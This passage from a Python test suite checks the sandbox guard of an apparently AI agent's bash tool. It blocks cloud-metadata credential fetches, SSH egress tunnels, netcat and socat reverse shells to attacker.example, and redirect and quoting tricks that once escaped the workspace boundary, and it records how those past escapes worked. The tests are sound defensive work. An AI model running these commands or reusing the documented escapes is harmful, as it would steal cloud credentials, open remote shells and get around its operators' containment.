    target would be permitted and the test would pass for the wrong reason.
    """
    import tempfile as _tf

    monkeypatch.setattr(_tf, "gettempdir", lambda: "/fake-os-temp")
    workspace = tmp_path / "ws"
    workspace.mkdir()
    outside = tmp_path / "outside"           # a sibling of the workspace
    outside.mkdir()
    target = outside / "victim.txt"
    tool = BashTool()
    result = _run(tool.execute({
        "command": f"echo x > {target}",
        "sandbox": "workspace-write",
        "workdir": str(workspace),
    }))
    assert result.error is True
    assert "sandbox" in result.content
    assert "not executed" in result.content
    assert not target.exists()


def test_execute_workspace_write_blocks_a_protected_file_it_built(
    tmp_path, monkeypatch
):
    """execute() refuses a write to a protected daemon state file, with the
    target built by THIS test (rant 2026-09-17T11:38:16).

    The three deleted variants read or wrote the host's real ``~/.emrg/config.toml``,
    so their safety rested on the guard they were testing: the mutation arm that
    forced the guard to ALLOW truncated that file to ``x``. Here ``~`` is pinned to
    scratch, so the target resolves inside this test's own directory and the same
    arm can only reach this test's sentinel. The surviving bytes are what proves the
    shell never ran the command.
    """
    home = tmp_path / "home"
    home.mkdir()
    # expanduser("~") reads USERPROFILE on Windows, HOME elsewhere.
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    victim = home / ".emrg" / "config.toml"
    victim.parent.mkdir(parents=True)
    victim.write_text("sentinel = true\n", encoding="utf-8")
    workspace = tmp_path / "ws"
    workspace.mkdir()
    tool = BashTool()
    result = _run(tool.execute({
        "command": f"echo x > {victim}",
        "sandbox": "workspace-write",
        "workdir": str(workspace),
    }))
    assert result.error is True
    assert "protected" in result.content
    assert victim.read_text() == "sentinel = true\n"


def test_execute_sandboxed_success_tags_output():
    tool = BashTool()
    result = _run(tool.execute({
        "command": "echo hi",
        "sandbox": "workspace-write",
    }))
    assert not result.error
    assert "[sandbox:workspace-write enforcement=partial] ok" in result.content
    assert "hi" in result.content


def test_execute_danger_full_access_unchanged():
    tool = BashTool()
    result = _run(tool.execute({"command": "echo hello", "sandbox": "danger-full-access"}))
    assert not result.error
    assert "hello" in result.content
    assert "sandbox" not in result.content


def test_execute_no_sandbox_key_unchanged():
    """Default (no sandbox key) = danger-full-access = current behavior."""
    tool = BashTool()
    result = _run(tool.execute({"command": "echo hello"}))
    assert not result.error
    assert "hello" in result.content
    assert "sandbox" not in result.content


# ── containment-escape guard (issue #1102) ─────────────────────────────────
# Borrowed from Claude Code v2.1.257 ("Containment Escape"): block cloud
# metadata-credential fetches and egress tunnels under the checked tiers.
# A metadata fetch is a READ — the write-target scan cannot catch it, so the
# destination-based check must run on both read-only and workspace-write.

def test_containment_blocks_metadata_endpoints():
    """Cloud metadata endpoints (IMDSv1/v2, ECS, GCP) are never legitimate in
    development commands — blocked under both checked tiers."""
    for cmd in (
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "curl http://169.254.169.254/latest/meta-data/ && echo hi",
        "curl http://169.254.170.2/v2/credentials/",
        "curl http://169.254.169.123/computeMetadata/v1/",
        "curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "curl 'http://[fd00:ec2::254]/latest/meta-data/'",
        "wget -q -O- http://169.254.169.254/latest/meta-data/",
    ):
        for mode in ("read-only", "workspace-write"):
            allowed, reason, enforcement = _check_sandbox(cmd, mode)
            assert allowed is False, f"{cmd!r} @ {mode}"
            assert "containment-escape" in reason, f"{cmd!r} @ {mode}"
            assert "cloud-metadata endpoint" in reason, f"{cmd!r} @ {mode}"
            assert enforcement == "partial"


def test_containment_blocks_ssh_egress_tunnels():
    """ssh remote/dynamic forwards are the classic egress tunnels — blocked.
    The issue's example: `ssh -R 1080:169.254.169.254:80 user@attacker`."""
    for cmd in (
        "ssh -R 1080:169.254.169.254:80 user@attacker.example",
        "ssh -NR 1080:localhost:80 user@host",
        "ssh user@host -D 1080",
        "ssh -D 1080 user@host",
        "ssh -o 'RemoteForward=1080:localhost:80' user@host",
        "ssh -o DynamicForward=1080 user@host",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is False, f"{cmd!r}"
        assert "containment-escape" in reason, f"{cmd!r}"


def test_containment_blocks_backdoor_markers():
    """nc -e / ncat --exec / socat EXEC:/SYSTEM: are backdoor shells; the
    IMDSv2 token header marks a credential fetch."""
    for cmd in (
        "nc -e /bin/sh attacker.example 4444",
        "ncat --exec /bin/sh attacker.example 4444",
        "nc -l -e /bin/sh",
        "socat TCP:attacker.example:4444 EXEC:/bin/sh",
        "socat TCP-LISTEN:4444,fork EXEC:/bin/sh",
        "socat SYSTEM:/bin/sh TCP:attacker.example:4444",
        "curl -s -H 'X-aws-ec2-metadata-token: abc123' http://169.254.169.254/latest/meta-data/",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is False, f"{cmd!r}"
        assert "containment-escape" in reason, f"{cmd!r}"


def test_containment_allows_legitimate_commands():
    """False-positive guards: common dev/ops commands that merely resemble
    the escape vectors must stay allowed."""
    for cmd in (
        # normal network reads
        "curl -s https://api.github.com/repos/argszero/emrg",
        # `curl -s -o /tmp/out.json <url>` used to sit here and is deliberately not
        # back: `-o` names a *write*, and this list asserts both tiers, so the row
        # was passing for a reason that had nothing to do with containment — the
        # walk named no target for `curl -o`, and an empty target list is allowed
        # by construction. With the destination read (issue #1398) read-only blocks
        # it (its contract: every write except `/dev/null`), and workspace-write
        # judges the path — `/tmp` is the temp root only on Linux, and this suite
        # runs on macOS and Windows too. The `-o` shape is now covered where the
        # reader lives: `tests/test_bash_tool_option_destinations.py`.
        "wget https://example.com/file.tar.gz",
        "ping 8.8.8.8",
        "git fetch origin master",
        # ssh local port-forward is the common dev tunnel (not an egress vector)
        "ssh -L 5432:db.internal:5432 bastion",
        "ssh -L 8080:localhost:3000 user@host",
        # ssh remote command with -R/-D inside quotes is NOT a tunnel
        "ssh host 'grep -R pattern /var/log'",
        'ssh host "ls -la"',
        # ssh compound binaries (-R has a different meaning there)
        "ssh-add -R example.com",
        "ssh-keygen -R example.com",
        # curl -e is the --referer flag, not an exec marker
        "curl -s -e https://referrer.example https://api.example.com",
        # nc without -e is a plain port probe/listener
        "nc -l 1234",
        "nc -vz host 80",
        # socat without EXEC/SYSTEM is a dev pipe tool
        "socat -d -d TCP-LISTEN:8080,fork STDOUT",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is True, f"{cmd!r} should be allowed (got {reason!r})"
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} should be allowed under read-only (got {reason!r})"


def test_containment_allows_git_push_under_workspace_write():
    """git push is a workspace-write normal action (only read-only blocks git
    mutators) — the containment guard must not interfere with it."""
    allowed, reason, _ = _check_sandbox("git push origin master", "workspace-write")
    assert allowed is True, f"git push should be allowed (got {reason!r})"


def test_containment_reason_names_escape_vector():
    """The block reason names the exact escape vector so the caller can
    surface it — no silent pass."""
    allowed, reason, _ = _check_sandbox(
        "curl http://169.254.169.254/latest/meta-data/", "workspace-write"
    )
    assert allowed is False
    assert "cloud-metadata endpoint" in reason
    assert "169.254.169.254" in reason
    allowed, reason, _ = _check_sandbox(
        "ssh -R 1080:localhost:80 user@host", "workspace-write"
    )
    assert allowed is False
    assert "ssh egress tunnel" in reason


class _FakeProc:
    """Enough of asyncio's subprocess API for `execute()`'s success path."""

    pid = 4242
    returncode = 0

    async def communicate(self):
        return (b"", b"")

    async def wait(self):
        return 0

    def kill(self):
        pass


class _SpawnRecorder:
    """A stand-in for the shell: records the command instead of running it.

    Issue #1319. An execute()-level negative test is only as safe as the guard it
    tests, and a mutation arm breaks that guard on purpose. With the real shell,
    `test_execute_containment_blocks_curl_metadata` then made a genuine request to a
    link-local metadata endpoint and stalled the suite past the tool timeout, so the
    arm reported a hang rather than a failure. Recording makes the claim sharper as
    well: it asserts "the vector never reached the shell" - what the guard is for -
    instead of "the guard said no", and under a broken guard the non-empty list
    reddens the test in milliseconds with nothing sent.
    """

    def __init__(self) -> None:
        self.commands: list[str] = []

    async def __call__(self, cmd, **kwargs):
        self.commands.append(cmd)
        return _FakeProc()


def _record_spawns(monkeypatch) -> _SpawnRecorder:
    """Point `execute()`'s shell spawn at a recorder and hand it back."""
    recorder = _SpawnRecorder()
    monkeypatch.setattr(asyncio, "create_subprocess_shell", recorder)
    return recorder


def test_execute_containment_blocks_curl_metadata(monkeypatch):
    """execute() integration: a metadata fetch is blocked under workspace-write with
    the ⛔ sandbox banner - and blocked *before* the shell sees it.

    The spawn is a recorder (issue #1319): the command that must never run is a real
    request to a link-local metadata endpoint, so the discriminating assertion is the
    empty list, and a mutation arm reports a fast failure instead of a stall.
    """
    spawns = _record_spawns(monkeypatch)
    tool = BashTool()
    result = _run(tool.execute({
        "command": "curl http://169.254.169.254/latest/meta-data/",
        "sandbox": "workspace-write",
    }))
    # First, because it is the claim that matters and the one a broken guard breaks:
    # the arm then names the hazard instead of reporting a missing banner.
    assert spawns.commands == [], (
        f"the metadata vector reached the shell: {spawns.commands!r}"
    )
    assert result.error is True
    assert "sandbox" in result.content
    assert "containment-escape" in result.content
    assert "not executed" in result.content


def test_the_recorder_sees_a_spawn_that_the_guard_allows(monkeypatch):
    """The empty list above is evidence only if the recorder can be non-empty.

    A one-sided instrument proves nothing: `spawns.commands == []` would also hold if
    the recorder were never wired in at all. So a command the guard really allows has
    to reach it - the danger tier opts into no blocking, and the command is harmless
    by construction, which the recorder also guarantees here.
    """
    spawns = _record_spawns(monkeypatch)
    tool = BashTool()
    result = _run(tool.execute({
        "command": "echo hi",
        "sandbox": "danger-full-access",
    }))
    assert not result.error
    assert spawns.commands == ["echo hi"]


def test_execute_danger_tier_warns_but_runs():
    """danger-full-access opts into no blocking, but a containment-escape
    command still gets a visible warning in the tool result. (The command is
    an echo of the vector — the guard scans command text, not network.)"""
    tool = BashTool()
    result = _run(tool.execute({
        "command": "echo 'curl http://169.254.169.254/latest/meta-data/'",
        "sandbox": "danger-full-access",
    }))
    assert not result.error
    assert "containment-escape" in result.content
    assert "executed anyway" in result.content


# ── write-target parsing (issue #1162) ────────────────────────────────────
#
# The extractor used to regex-scan raw text, which was wrong in BOTH
# directions and the two failures had one cause: it could not tell a `>`
# that was an operator from one inside an argument. These tests pin both
# sides, and then pin the invariant itself rather than the verb list.

def test_quoted_redirect_is_not_a_write_target():
    """Issue #1162: a `>` inside a quoted argument is data, not an operator.

    Measured on master: every one of these was BLOCKED under read-only, with
    reasons like `targeting 'b"'` and `targeting '0)"'`. One of them cost a
    real cycle a retry — a `gh issue create` whose *title* contained `>`.
    """
    for cmd in (
        'echo "a > b"',
        'grep -n "x > y" file.txt',
        'python3 -c "print(1 > 0)"',
        'git log --oneline --grep="a > b"',
        'gh issue create --title "fix a > b comparison" --body-file /tmp/x.md',
        'echo "IGNORED -> writing here leaves porcelain clean"',
    ):
        assert _extract_write_targets(cmd) == [], cmd
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"


def test_real_redirects_are_still_write_targets():
    """The positive control: dropping quoted ones must not drop real ones."""
    assert _extract_write_targets("echo x > /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("echo x >> /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("cmd 2> err.txt") == ["err.txt"]
    assert _extract_write_targets("cmd &> out.txt") == ["out.txt"]
    for cmd in ("echo x > /tmp/y", "echo x >> /tmp/y", "cmd 2> err.txt"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd


def test_is_redirect_operator_covers_the_spellings_the_walk_recognises():
    """The predicate must still accept everything it accepted before.

    It is now judged by shape (a `>` and nothing path-like) rather than by a
    list, because the list was missing `>|` and `<>` — see
    `test_a_clobber_redirect_names_the_target_it_writes`. The negatives here are
    the ones a looser rule would break: a bare `<` reads, and `|`, `;` and a
    plain word are not redirects.
    """
    for tok in (">", ">>", "&>", "&>>", "2>", "22>>"):
        assert _is_redirect_operator(tok) is True, tok
    for tok in (">|", "1>|", "2>|", "<>", "0<>", ">&", "2>&1", "5>&-", "&>>"):
        assert _is_redirect_operator(tok) is True, tok
    for tok in ("out.txt", "/tmp/y", "2", "a>b", "<", "|", ";", "&&", "<<", ">>>foo"):
        assert _is_redirect_operator(tok) is False, tok


def test_a_quoted_operator_cannot_hide_the_real_redirect_target():
    """Issue #1268: a quoted `>` used to swallow the next token as its target.

    `'>'` and `>` dequote to the same token, so the walk could not tell a quoted
    operator from a real one. It took the following token blindly, which meant
    `echo '>' > /etc/x` produced the target `['>']` — and the *real* redirect
    vanished. Measured on master `065ee9d5` end to end through
    `BashTool.execute()` at workspace-write: the call returned success and
    `/Users/argszero/emrg-phantom-proof.txt` really existed afterwards, while
    `echo x > <the same path>` was refused. The boundary was escaped by one
    quoted character.

    An operator is never a path, so the walk now skips operator tokens and names
    the target the shell will actually write.
    """
    outside = "/etc/emrg-1268-probe.txt"
    for cmd in (
        f"echo '>' > {outside}",
        f"echo '>' >> {outside}",
        f"echo '>>' > {outside}",
    ):
        targets = _extract_write_targets(cmd)
        assert outside in targets, f"{cmd!r} must name the real target, got {targets!r}"
        assert ">" not in targets, f"{cmd!r} must not treat an operator as a path"
        for tier in ("read-only", "workspace-write"):
            allowed, reason, _ = _check_sandbox(cmd, tier)
            assert allowed is False, f"{cmd!r} must be blocked at {tier} (got {reason!r})"


def test_the_operator_skip_does_not_swallow_a_real_target():
    """The positive control for the skip: no operator means no skipping.

    If the walk skipped the token after every operator unconditionally, a real
    redirect would lose its target — a hole in the other direction, and the
    reason the fix walks only over *operators*.
    """
    assert _extract_write_targets("echo x > /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("echo x >> /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("cmd 2> err.txt") == ["err.txt"]
    assert _extract_write_targets("echo '>' > /tmp/y") == ["/tmp/y"]
    # A quoted operator with no redirect at all is not one either — the
    # over-block half of #1268, closed once the walk recovers quoting from the
    # raw line (see the tests below). Before that this read `["file.txt"]`.
    assert _extract_write_targets("grep -n '>' file.txt") == []
    # …and because a quoted operator *is* a path, the skip must stop at it when
    # it is the redirect's operand, rather than walking past it looking for
    # another operator to skip. The file this names is the literal `>`.
    assert _extract_write_targets("echo x > '>'") == [">"]


# The over-block half of #1268. On master `6e0a19c3` every one of these reported
# a write target and was refused under `read-only` — "targeting 'file.txt'" for
# the first — although the shell writes nothing at all: quoting is what makes a
# word a path, and a quoted operator is never a redirect. The corpus is the
# shapes a real session meets (grepping for a redirect character, grepping a
# quoted character, testing a comparison operand), not shapes chosen to pass.
QUOTED_OPERATOR_READS = [
    "grep -n '>' file.txt",
    'grep -n ">" file.txt',
    "grep -rn '>' src/",
    "test 1 '>' 2",
    "echo '>'",
    "printf '>'",
    "echo '<' foo",
    "ls | grep '>'",
]


@pytest.mark.parametrize("cmd", QUOTED_OPERATOR_READS)
def test_a_quoted_operator_with_no_redirect_is_not_a_write_target(cmd: str):
    """Issue #1268, the half #1269 left open: a quoted word is a path, not a redirect.

    `'>'` and `>` dequote to the same token, so the walk cannot answer this from
    the token stream — the fact is recovered from the raw line
    (`_fully_quoted_token_indexes`). Without it the quoted `>` was read as an
    operator and the *next word* became its target, which refused ordinary reads
    at the tier whose job is to refuse writes: `grep -n '>' file.txt`.
    """
    assert _extract_write_targets(cmd) == [], cmd
    allowed, reason, _ = _check_sandbox(cmd, "read-only")
    assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"


def test_the_quoting_repair_does_not_reopen_the_quoted_operator_escape():
    """The other direction, pinned by the same change: #1269's escape stays shut.

    The repair could have gone too far in exactly one way — deciding a *real*
    redirect was quoted — so every shape that has a real redirect behind a quoted
    operator is asserted to still name the outside target and still be refused.
    """
    outside = "/etc/emrg-1268b-probe.txt"
    for cmd in (
        f"echo '>' > {outside}",
        f"echo '>' >> {outside}",
        f"echo '>' >| {outside}",
        f"echo '>' <> {outside}",
    ):
        targets = _extract_write_targets(cmd)
        assert outside in targets, f"{cmd!r} must name the real target, got {targets!r}"
        for tier in ("read-only", "workspace-write"):
            allowed, reason, _ = _check_sandbox(cmd, tier)
            assert allowed is False, f"{cmd!r} must be blocked at {tier} (got {reason!r})"


def test_fully_quoted_token_indexes_recovers_quoting_or_claims_nothing():
    """The repair itself, including the case where it refuses to guess.

    The pairing is by index between the walk's POSIX reading and a second reading
    with quoting kept, so the two must agree on how many words there are. When
    they disagree the helper answers **None** — "cannot answer" — which is not the
    same fact as the empty set ("answered, and no word is quoted"), and the walk
    acts on the difference: in *operator* position it still believes every
    operator-shaped token (a real redirect keeps its target), while in *target*
    position it names the operator-shaped tail of a run instead of believing it
    (issue #1280, where the empty-set fallback dropped a target and `read-only`
    allowed a write). Keeping the two states apart is what lets both directions
    stay on the fail-closed side.
    """
    def quoted(cmd: str) -> set[int] | None:
        return _fully_quoted_token_indexes(cmd, _split_command_tokens(cmd))

    # The one reason this helper exists: a quoted operator standing alone.
    assert quoted("echo '>' foo") == {1}
    assert quoted("echo '>' > /etc/x") == {1}
    assert quoted("echo x > /etc/x") == set()
    # A `>` inside a longer quoted word, where the token stream alone sufficed.
    assert quoted("echo 'a > b'") == {1}
    assert quoted('echo "a b"') == {1}
    # A *partially* quoted word is not a quoted word: `'a'b` and `a'b'` both
    # dequote to `ab`, and neither may be claimed (the whole word must be
    # wrapped). Asserted because the obvious implementation — "does the token
    # contain a quote character" — would wrongly claim both. The first is also a
    # word-count disagreement, so it must answer *cannot answer*, not "nothing
    # is quoted": the shell reads the second half of `> '>'` behind it as a path.
    assert quoted("echo 'a'b") is None
    assert quoted("echo a'b'") == set()
    # The readings disagree here (`["echo", "it's"]` with quoting resolved, three
    # words with quoting kept) — and the second lex cannot parse it at all, which
    # lands on the same answer.
    assert quoted("echo 'it'\\''s'") is None
    # …and these two are the same disagreement with a *discriminating* answer:
    # a pairing that paired anyway would claim index 0 in both (`'a'` against
    # `'a'`, `'>'` against `'>'`), and a wrong pairing is what can decide a real
    # operator was quoted and drop its target. Measured over 30,783 generated
    # commands: dropping the guard changes 541 walk answers, 493 of them by
    # dropping a target, outside ones included — so the guard is the fail-closed
    # side, not decoration.
    assert quoted("'a' 'a'b") is None
    assert quoted("'>' '>'x") is None
    # Input the lexer cannot parse takes `_split_command_tokens`' whitespace
    # fallback, where a token can still carry its quote characters. `'a'` there
    # is not a quoted word, it is a token whose *text* contains quotes, and
    # claiming it would be claiming an artefact of the fallback. (This is the
    # case the interior-equality clause exists for: no generated command with a
    # redirect changes its walk answer when that clause is loosened.) The two
    # readings happen to agree here, so it is an *answer*, not a refusal to give
    # one — the distinction the empty set and None are kept apart for.
    assert quoted("'a' it's") == set()


# Issue #1275. A duplication operand is a file *descriptor*, not a path, so
# these open nothing — measured with **both** shells in a fresh scratch
# directory per row, because a verdict mismatch alone is not a bug and `/bin/sh`
# does not always agree with bash. Each one used to report target `'1'`/`'2'`
# (or `'-'`) and be refused at `read-only`, the tier a dirty-tree downgrade
# forces a cycle into — an over-block of ordinary diagnostics where they are
# most needed. `>>&` is deliberately absent: it is a bash **syntax error**
# (`unexpected token`), so its line never runs and is not this class.
FD_DUPLICATIONS = [
    "grep -n x f.txt 2>&1",
    "echo hi 2>&1",
    "grep -n x f.txt 1>&2",
    "grep -n x f.txt >&2",
    "grep -n x f.txt 2>&-",
    "grep -n x f.txt 2>& 1",
]


@pytest.mark.parametrize("cmd", FD_DUPLICATIONS)
def test_an_fd_duplication_operand_is_not_a_write_target(cmd: str):
    """`2>&1` merges stderr into stdout; it names a descriptor, not a file."""
    targets = _extract_write_targets(cmd)
    assert "1" not in targets and "2" not in targets and "-" not in targets, targets
    allowed, reason, _ = _check_sandbox(cmd, "read-only")
    assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"


def test_a_real_redirect_beside_a_duplication_still_names_its_target():
    """The fix must not swallow the write on the same line.

    `2>&1` is skipped, but the `> out.log` next to it is a real file: dropping
    the descriptor must not drop the target, or a write would become invisible.
    """
    for cmd, expected in (
        ("echo hi 2>&1 > out.log", ["out.log"]),
        ("echo hi > out.log 2>&1", ["out.log"]),
        ("echo hi 2>&1 > out.log 2>&1", ["out.log"]),
    ):
        assert _extract_write_targets(cmd) == expected, cmd
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} writes a file and must be refused ({reason!r})"


def test_the_operator_spelling_decides_a_duplication_not_the_operand():
    """`&>` is the *other* operator: its numeric operand really is a file name.

    This is the discriminator the fix has to use, and the tempting shortcuts
    both fail here — "the operand is numeric" would drop a real write to a file
    called `1`, and "the operand is separated by a space" would drop `out.log`
    in `>& out.log`, which bash and sh both create. `read-only` is the tier
    asserted, because these targets are relative and a relative target inside
    the workspace is exactly what `workspace-write` exists to allow.
    """
    written = {
        "echo x > 1": ["1"],
        "echo x &>1": ["1"],
        "echo x >&1x": ["1x"],
        "echo x >& out.log": ["out.log"],
        "echo x >&'out.log'": ["out.log"],
    }
    for cmd, expected in written.items():
        assert _extract_write_targets(cmd) == expected, cmd
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked at read-only ({reason!r})"


def test_is_fd_operand_accepts_only_the_spellings_the_shell_reads_as_descriptors():
    """Direct test of the predicate, including the case `str.isdigit` gets wrong."""
    for tok in ("0", "1", "2", "10", "-"):
        assert _is_fd_operand(tok) is True, tok
    for tok in ("", "1x", "out.log", "./1", "-1", "1 ", ">", "²", "١", "١٢"):
        assert _is_fd_operand(tok) is False, tok


OUTSIDE_CLOBBER = "/etc/emrg-clobber-probe.txt"

# The spellings a shell really writes with and the walk did not call operators.
# Measured on master `b0bd6188` in a throwaway directory: bash and sh each
# created the file for `>|` and bash created it for `<>`; `>>|`, `>>&` and `&>>`
# created nothing, so they are not claimed here.
CLOBBER_WRITES = [
    "echo x >| {o}",
    "echo '>' >| {o}",
    "echo x 1>| {o}",
    "echo x <> {o}",
    "echo '>' <> {o}",
    "echo x 0<> {o}",
]


@pytest.mark.parametrize("cmd", [c.format(o=OUTSIDE_CLOBBER) for c in CLOBBER_WRITES])
def test_a_clobber_redirect_names_the_target_it_writes(cmd: str):
    """`>|` and `<>` are redirects, so their operand is the target — not nothing.

    Before this shape test the walk reported `[]` for `echo x >| /etc/f` at both
    tiers, and the file was really written: on master the guard's answer and the
    shell's behaviour disagreed in the direction that loses work.
    """
    targets = _extract_write_targets(cmd)
    assert OUTSIDE_CLOBBER in targets, f"{cmd!r} must name the target, got {targets!r}"
    for tier in ("read-only", "workspace-write"):
        allowed, reason, _ = _check_sandbox(cmd, tier)
        assert allowed is False, f"{cmd!r} must be blocked at {tier} (got {reason!r})"


@pytest.mark.parametrize("cmd", [c.format(o=OUTSIDE_CLOBBER) for c in CLOBBER_WRITES])
def test_the_same_redirects_without_the_clobber_spelling_were_already_blocked(cmd: str):
    """The control, derived rather than hand-listed: the `>` half alone blocked.

    `echo x > /etc/f` was already refused before this change, so the flip above
    is about the operator being recognised and not about a broader refusal.
    """
    plain = cmd.replace(">|", ">").replace("<>", ">").replace("0>", ">").replace("1>", ">")
    targets = _extract_write_targets(plain)
    assert OUTSIDE_CLOBBER in targets, f"{plain!r} must name the target, got {targets!r}"


def test_a_read_redirect_is_not_a_write_target():
    """`<` reads, so its operand must stay out of the target list.

    This is the asymmetry the shape test keeps on purpose: calling `<` an
    operator would make `cat < /etc/passwd` name `/etc/passwd` as a *write*
    target, i.e. refuse a read — an over-block bought with a fix that does not
    need it.
    """
    assert _is_redirect_operator("<") is False
    assert _extract_write_targets("cat < /etc/passwd") == []
    allowed, reason, _ = _check_sandbox("cat < /etc/passwd", "workspace-write")
    assert allowed is True, reason


def test_non_recursive_and_unlisted_writers_are_destructive():
    """Issue #1162: one verb, two spellings, opposite verdicts.

    `rm` was destructive only when a recursive flag was present, so
    `rm a.txt` deleted a file the same guard refused to let `rm -rf dir`
    touch. The listed-writers gap is the same defect one step further out.
    """
    for cmd, target in (
        ("rm a.txt", "a.txt"),
        ("rm -f a.txt", "a.txt"),
        ("cp b.txt a.txt", "a.txt"),
        ("truncate -s 0 a.txt", "a.txt"),
        ("tee a.txt", "a.txt"),
    ):
        assert target in _extract_write_targets(cmd), cmd
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} deletes/overwrites and must be blocked"


def test_sed_in_place_is_blocked_but_a_filter_is_not():
    """`sed -i` rewrites its file arguments; a bare `sed` only writes stdout.

    The flag can carry a suffix (`-i.bak`), so the decision is on the flag
    prefix rather than an exact match.
    """
    for cmd in ("sed -i '' 's/x/y/' a.txt", "sed -i.bak 's/x/y/' a.txt"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd
    for cmd in ("sed 's/x/y/' a.txt", "sed -n 1p a.txt"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a filter and must be allowed ({reason!r})"


def test_chain_separators_stop_the_argument_scan():
    """A chain's later command is not an argument of the earlier one."""
    assert _extract_write_targets("rm -rf /tmp/x; echo hi") == ["/tmp/x"]
    assert _extract_write_targets("echo hi && rm x.txt") == ["x.txt"]
    allowed, _, _ = _check_sandbox("ls -la && git status", "read-only")
    assert allowed is True


def test_write_guard_preserves_the_tree_it_promises_not_to_touch(tmp_path):
    """The invariant, not the verb list (issue #1162's own suggestion).

    Run each representative mutator in a scratch repo under its DECIDED
    verdict and assert the tree is unchanged. A list-based test can only be
    as complete as the list; this fails loudly when a spelling slips through
    — which is exactly how `rm a.txt` and `sed -i` went unnoticed.
    """
    import subprocess as sp

    repo = tmp_path / "scratch"
    repo.mkdir()
    (repo / "a.txt").write_text("original\n", encoding="utf-8")
    (repo / "b.txt").write_text("other\n", encoding="utf-8")
    sp.run(["git", "init", "-q"], cwd=repo, check=True)
    sp.run(["git", "add", "-A"], cwd=repo, check=True)
    sp.run(["git", "-c", "user.email=e@x", "-c", "user.name=t", "commit", "-qm", "init"],
           cwd=repo, check=True)
    (repo / "a.txt").write_text("uncommitted edit\n", encoding="utf-8")
    before = sp.run(["git", "status", "--porcelain"], cwd=repo,
                    capture_output=True, text=True, encoding="utf-8").stdout

    for cmd in ("rm a.txt", "rm -f a.txt", "cp b.txt a.txt", "truncate -s 0 a.txt",
                "tee a.txt", "sed -i '' 's/original/x/' a.txt"):
        allowed, _, _ = _check_sandbox(cmd, "read-only", str(repo))
        assert allowed is False, f"{cmd!r} must be blocked under read-only"
        # The guard is static, so a block means the command never ran. Assert
        # the file is intact rather than assuming it.
        assert (repo / "a.txt").read_text(encoding="utf-8") == "uncommitted edit\n", cmd

    after = sp.run(["git", "status", "--porcelain"], cwd=repo,
                   capture_output=True, text=True, encoding="utf-8").stdout
    assert after == before


def test_option_values_are_not_mistaken_for_file_operands():
    """Argument filtering must skip the *value* an option consumes.

    Dropping every token that starts with ``-`` is not enough: in
    ``truncate -s 0 a.txt`` the first non-flag token is the size ``0``, so a
    naive filter reports ``0`` as the file to be written. That still blocks —
    but it names a token that is not a path, and a guard whose message points
    at the wrong thing is one nobody can act on. The operands are what the
    message must name.
    """
    targets = _extract_write_targets("truncate -s 0 a.txt")
    assert targets == ["a.txt"], targets
    # Same shape via the verbose spelling, and for a file whose name could be
    # confused with a value.
    assert _extract_write_targets("truncate --size 12 report.txt") == ["report.txt"]
    assert _extract_write_targets("tee -a log.txt") == ["log.txt"]
    # `sed`'s first operand is the script, not a file to rewrite.
    assert _extract_write_targets("sed -i s/a/b/ f.txt") == ["f.txt"]


def test_find_delete_is_a_destructive_write_but_a_plain_find_is_not():
    """`find ... -delete` removes matches; `find` alone only prints them.

    Issue #1162 listed `find . -name "*.pyc" -delete` among the destructive
    writes that read-only allowed. The guard must separate the two: blocking
    every `find` would refuse an ordinary read, which is the over-block
    failure this change exists to remove.
    """
    for cmd in ('find . -name "*.pyc" -delete', "find build -type f -delete"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd
        assert "destructive write" in reason, reason
    for cmd in ("find . -name '*.pyc'", "find . -name '*.pyc' -print", "find . -type d"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"

# ── git mutator / shell-wrapper regression guards (from #1167) ──────────
#
# PR #1167's own guards. They are branch-only relative to master (master has
# the write-target guards from #1168 instead), and the two sets are disjoint
# — neither side's tests cover the other's feature. Kept whole rather than
# side-picked: taking either side silently drops a class of coverage.

def test_check_read_only_allows_shell_c_without_a_mutator():
    """Recursing into a wrapper must not block the wrapper itself — the
    payload is judged, and a read inside `sh -c` stays a read."""
    for cmd in (
        "sh -c 'git status'",
        "sh -c 'git log --oneline'",
        "bash -c 'echo hello'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"

def test_check_read_only_blocks_chained_mutator_under_a_prefix():
    """A prefixed chain must block: the old scan fell through to `return True`.

    When the prefix made the regex miss, `m` was None, so the exemption check
    and the anti-chain logic never ran at all — `git -C . stash list && git -C
    . stash drop` was ALLOWED. The bare chained form already blocked, so only
    the prefixed one catches this.
    """
    for cmd in (
        "git -C . stash list && git -C . stash drop",
        "git -C . stash show -p && git -C . stash pop",
        "git --no-pager stash list; git --no-pager stash clear",
        "git -c x=1 worktree list && git -c x=1 worktree remove ../wt",
        "git status && git -C . checkout .",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_git_mutators_with_global_options():
    """Community issue #1156: a git global option must not defeat the guard.

